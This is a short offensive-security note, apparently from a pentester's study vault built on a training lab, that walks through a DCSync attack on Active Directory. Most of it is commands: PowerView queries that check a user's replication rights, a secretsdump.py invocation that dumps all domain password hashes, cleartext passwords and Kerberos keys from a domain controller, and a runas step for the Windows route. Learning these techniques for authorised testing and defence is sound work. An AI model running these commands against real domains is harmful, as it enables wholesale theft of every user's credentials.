-- -
Can be used after you get domain admin or if you get a user with these privs. This attack is used to sync AD so you should get all users and their saved hashes from the DC. First, verify your user can do this

*Note: these powershell commands require you open powershell and import PowerView.ps1*
#### Get User SID
```powershell
Get-DomainUser -Identity <user> | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```
#### Check User's Replication Rights
```powershell
# Set SID
$sid= "<user sid>"
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

# Get replication rights
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
#### Perform DSync Attack
**From linux**
```bash
secretsdump.py -outputfile inlanefright_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
Note: The above command will output multiple files:
1. The user hases in `.ntds`
2. Cleartext passwords if user had reversible encryption set in `.ntds.cleartext` 
3. Kerberos keys in `.ntds.kerberos`
**From Windows**
Make sure you run this from the perspective of the user with Sync privileges, if you need to force this:
```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```
Then run attack:
![[Hacking Scratch/Tools/mimikatz#^21193e]]
